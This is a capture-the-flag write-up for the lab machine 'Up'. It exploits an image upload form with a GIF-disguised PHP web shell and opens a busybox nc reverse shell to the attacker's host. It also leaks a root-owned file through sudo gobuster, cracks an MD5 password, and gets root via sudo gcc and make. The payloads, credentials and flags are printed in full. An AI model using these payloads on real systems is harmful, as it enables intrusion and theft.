# Up

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.86:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.86
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: RodGar - Subir Imagen
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/up/writeup.png)

Enum
```bash
└─$ feroxbuster -u http://10.0.2.86/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET      150l      388w     4489c http://10.0.2.86/index.php
301      GET        9l       28w      311c http://10.0.2.86/javascript => http://10.0.2.86/javascript/
301      GET        9l       28w      308c http://10.0.2.86/uploads => http://10.0.2.86/uploads/
```

### File Upload

Try upload
```bash
└─$ curl 'http://10.0.2.86/' -F 'image=@usb.jpg; type=image/jpeg;' -s | html2markdown | trans -b :en
# Upload your Image
Click to upload a file Upload Image
The file has been uploaded successfully.
(C) RodGar
```

Content doesn't seem to matter
```bash
└─$ curl 'http://10.0.2.86/' -F 'image=@usb.jpg; type=text/php;' -s | html2markdown | trans -b :en
# Upload your Image
Click to upload a file Upload Image
The file has been uploaded successfully.
(C) RodGar
```

![writeup-1.png](/assets/pentest/hackmyvm/up/writeup-1.png)

```bash
└─$ feroxbuster -u http://10.0.2.86/uploads/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET        1l        1w     1301c http://10.0.2.86/uploads/robots.txt
```

```bash
└─$ curl 'http://10.0.2.86/uploads/robots.txt' -s | base64 -d
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetDir = "uploads/";
    $fileName = basename($_FILES["image"]["name"]);
    $fileType = pathinfo($fileName, PATHINFO_EXTENSION);
    $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);

    $allowedTypes = ['jpg', 'jpeg', 'gif'];
    if (in_array(strtolower($fileType), $allowedTypes)) {
        $encryptedFileName = strtr($fileBaseName,
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');

        $newFileName = $encryptedFileName . "." . $fileType;
        $targetFilePath = $targetDir . $newFileName;

        if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
            $message = "The file has been uploaded successfully.";
        } else {
            $message = "There was an error uploading the file.";
        }
    } else {
        $message = "Only JPG and GIF files are allowed.";
    }
}
?>
```

It's using ROT13 as "encryptor"
```bash
└─$ php -r "echo(strtr('shell.php', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'));"
furyy.cuc 

└─$ echo shell.php | rot13
furyy.cuc

└─$ curl 'http://10.0.2.86/' -F 'image=@shell.php;filename=furyy.cuc;type=image/gif;' -s | html2markdown | trans -b :en
# Upload your Image
Click to upload a file Upload Image
Only JPG and GIF files are allowed.
(C) RodGar
```

### RCE

Something allows RCE with PHP, but not PHP as extension. GIF can be uploaded and used as PHP! ???
```bash
└─$ echo 'GIF89;<?php system($_REQUEST[0]) ?>' > shell.php

└─$ curl 'http://10.0.2.86/' -F 'image=@shell.php;filename=furyy.gif;type=image/gif;' -s | html2markdown | trans -b :en
# Upload your Image
Click to upload a file Upload Image
The file has been uploaded successfully.
(C) RodGar

└─$ curl 'http://10.0.2.86/uploads/shell.gif' -d '0=id'
GIF89;uid=33(www-data) gid=33(www-data) groups=33(www-data)

└─$ curl 'http://10.0.2.86/uploads/shell.gif' --data-urlencode '0=cat .htaccess'
GIF89;Options -Indexes
ErrorDocument 403 /uploads/access_denied.html
```

## Reverse Shell (www-data)

```bash
└─$ curl 'http://10.0.2.86/uploads/shell.gif' --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash'
└─$ pwncat-cs -lp 4444
(remote) www-data@debian:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Lateral Movement (rodgar)

```bash
(remote) www-data@debian:/var/www/html/uploads$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/gobuster
```

There's a clue in uploads
```bash
(remote) www-data@debian:/var/www/html/uploads$ find . -type f -ls
   657060      4 -rw-r--r--   1 root     root          964 Oct 22  2024 ./access_denied.html
   657063      4 -rw-r--r--   1 www-data www-data       63 Oct 20  2024 ./.htaccess
   656860      4 -rw-r--r--   1 root     root           17 Oct 22  2024 ./clue.txt
   652811    188 -rw-r--r--   1 www-data www-data   190696 Oct 16 12:26 ./117qo0148qp179n2p2245p5n30r63no0.jpg
   652816      4 -rw-r--r--   1 www-data www-data       36 Oct 16 12:59 ./shell.gif
   657067      4 -rw-r--r--   1 root     root         1301 Oct 22  2024 ./robots.txt


(remote) www-data@debian:/var/www/html/uploads$ cat clue.txt
/root/rodgarpass
```

```bash
(remote) www-data@debian:/var/www/html/uploads$ sudo gobuster dir -u 10.0.2.15 -w /root/rodgarpass
---
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.86 - - [16/Oct/2025 15:21:35] "GET /d2aef649-50c4-4a44-8ff6-99d585964906 HTTP/1.1" 404 -
10.0.2.86 - - [16/Oct/2025 15:21:35] "GET /b45cffe084dd3d20d928bee85e7b0f2 HTTP/1.1" 404 -
```

It's not a password
```bash
(remote) www-data@debian:/var/www/html/uploads$ echo 'b45cffe084dd3d20d928bee85e7b0f2' | timeout 1 su rodgar -c id ;echo
Password:
```

Probably a hash, but last character seems to be missing (31+newline=32)
```bash
(remote) www-data@debian:/var/www/html/uploads$ echo 'b45cffe084dd3d20d928bee85e7b0f2' | wc
      1       1      32
```

```bash
└─$ for i in {1..15}; do printf '%x:b45cffe084dd3d20d928bee85e7b0f2%x\n' "$i" "$i"; done | tee hashes.txt
1:b45cffe084dd3d20d928bee85e7b0f21
2:b45cffe084dd3d20d928bee85e7b0f22
3:b45cffe084dd3d20d928bee85e7b0f23
4:b45cffe084dd3d20d928bee85e7b0f24
5:b45cffe084dd3d20d928bee85e7b0f25
6:b45cffe084dd3d20d928bee85e7b0f26
7:b45cffe084dd3d20d928bee85e7b0f27
8:b45cffe084dd3d20d928bee85e7b0f28
9:b45cffe084dd3d20d928bee85e7b0f29
a:b45cffe084dd3d20d928bee85e7b0f2a
b:b45cffe084dd3d20d928bee85e7b0f2b
c:b45cffe084dd3d20d928bee85e7b0f2c
d:b45cffe084dd3d20d928bee85e7b0f2d
e:b45cffe084dd3d20d928bee85e7b0f2e
f:b45cffe084dd3d20d928bee85e7b0f2f
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
# Nothing
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt --format=Raw-Md5
string           (1) # Cracked
```

```bash
(remote) www-data@debian:/var/www/html/uploads$ echo 'string' | timeout 1 su rodgar -c id ;echo
Password:
(remote) www-data@debian:/var/www/html/uploads$ echo 'b45cffe084dd3d20d928bee85e7b0f21' | timeout 1 su rodgar -c id ;echo
Password: uid=1001(rodgar) gid=1001(rodgar) grupos=1001(rodgar)
```

::: tip Creds
`rodgar:b45cffe084dd3d20d928bee85e7b0f21`
:::

### User.txt

```bash
rodgar@debian:~$ cat user.txt
b45cffe084dd3d20d928bee
```

## Privilege Escalation (root)

```bash
rodgar@debian:~$ sudo -l
Matching Defaults entries for rodgar on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User rodgar may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make
```

- [https://gtfobins.github.io/gtfobins/gcc](https://gtfobins.github.io/gtfobins/gcc)
- [https://gtfobins.github.io/gtfobins/make](https://gtfobins.github.io/gtfobins/make)

```bash
rodgar@debian:~$ sudo gcc -wrapper /bin/bash,-s .
root@debian:/home/rodgar# id
uid=0(root) gid=0(root) grupos=0(root)
```

or 

```bash
rodgar@debian:~$ sudo make -s --eval=$'x:\n\t-'"/bin/bash"
root@debian:/home/rodgar# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```bash
root@debian:~# cat rooo_-tt.txt
44b3f261e197124e60217d6ffe7e71a8e0175ae0
```